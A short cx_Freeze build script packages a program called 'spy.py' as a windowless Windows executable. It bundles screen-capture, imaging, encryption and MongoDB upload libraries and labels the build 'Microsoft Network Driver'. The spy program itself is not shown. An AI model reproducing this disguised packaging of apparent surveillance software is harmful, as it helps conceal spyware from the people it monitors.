import sys
from cx_Freeze import setup, Executable

# Dependencies are automatically detected, but it might need fine tuning.

build_exe_options = {"packages": ["gridfs","pyautogui","pygetwindow","rsa","pymongo","pyasn1","dns","numpy","shutil","cv2","requests"]}


# base="Win32GUI" should be used only for Windows GUI app
base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(
    name = "spy",
    version = "0.1",
    description = "Microsoft Network Driver",
    options = {"build_exe": build_exe_options},
    executables = [Executable("spy.py", base=base)]
)